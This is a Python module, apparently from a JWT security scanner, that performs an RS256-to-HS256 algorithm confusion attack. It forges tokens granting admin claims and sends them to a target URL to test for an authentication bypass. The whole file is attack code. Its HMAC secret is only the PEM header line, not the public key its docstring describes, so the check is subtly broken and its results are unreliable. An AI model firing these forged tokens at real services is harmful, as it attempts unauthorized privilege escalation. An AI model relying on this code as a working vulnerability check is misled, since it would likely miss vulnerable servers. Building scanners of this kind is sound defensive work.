"""RS256->HS256 algorithm confusion attack."""

import logging
from typing import Any

from ._helpers import (
    JWT_AUTH_HEADERS,
    _create_jwt,
    _decode_jwt_part,
    _get_original_status,
    _send_with_token,
)

logger = logging.getLogger(__name__)


def test_algorithm_confusion(token: str, url: str, session: Any) -> dict[str, Any]:
    """Test RS256->HS256 algorithm confusion.

    If the original token uses RS256, re-sign it with HS256 using the
    public key as the HMAC secret, which some servers mistakenly accept.
    """
    result: dict[str, Any] = {"attack": "algorithm_confusion", "vulnerable": False, "details": []}
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return result
        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            return result

        if not isinstance(header, dict) or header.get("alg") != "RS256":
            result["skipped"] = True
            result["reason"] = "Token does not use RS256"
            return result

        modified_payload = dict(payload)
        modified_payload["admin"] = True
        modified_payload["role"] = "admin"
        modified_payload["is_admin"] = True

        confusion_token = _create_jwt(
            {"alg": "HS256", "typ": "JWT"},
            modified_payload,
            secret=b"-----BEGIN PUBLIC KEY-----\n",
        )

        original_status = _get_original_status(url, session)

        for auth_header in JWT_AUTH_HEADERS:
            resp = _send_with_token(url, confusion_token, auth_header, session)
            status = resp.get("status", 0)

            if status in (200, 302) and original_status in (401, 403):
                result["vulnerable"] = True
                result["details"].append(
                    {
                        "auth_header": auth_header,
                        "status_code": status,
                        "original_status": original_status,
                        "finding": "alg_confusion_rs256_to_hs256_bypass",
                    }
                )
                break

        logger.info("Algorithm confusion test on %s: vulnerable=%s", url, result["vulnerable"])
    except Exception as e:
        logger.error("Algorithm confusion test error on %s: %s", url, e)
    return result
